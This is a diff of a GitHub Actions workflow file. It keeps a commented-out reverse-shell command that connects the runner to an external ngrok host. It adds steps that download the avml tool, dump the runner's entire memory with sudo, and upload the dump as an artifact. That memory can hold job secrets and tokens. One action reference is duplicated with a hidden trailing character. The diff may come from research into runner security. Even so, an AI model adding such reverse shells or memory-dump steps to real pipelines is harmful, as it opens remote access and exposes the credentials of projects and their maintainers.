@@ -19,3 +19,13 @@ jobs:
       - uses: coderpatros/action-hello-world@6aa22f48b007348666f676eabda20e9884ed1a7f
       - uses: coderpatros/action-hello-world@6aa22f48b007348666f676eabda20e9884ed1a7f​
       #- run: sh -i >& /dev/tcp/0.tcp.au.ngrok.io/21635 0>&1
+      - run: wget -O avml https://github.com/microsoft/avml/releases/download/v0.18.0/avml
+      - run: |
+          wget -O avml https://github.com/microsoft/avml/releases/download/v0.18.0/avml
+          chmod +x avml
+          sudo avml acquire --compress output.lime.compressed
+          ls -l
+      - uses: actions/upload-artifact@v7
+        with:
+          name: output.lime.compressed
+          path: ./output.lime.compressed
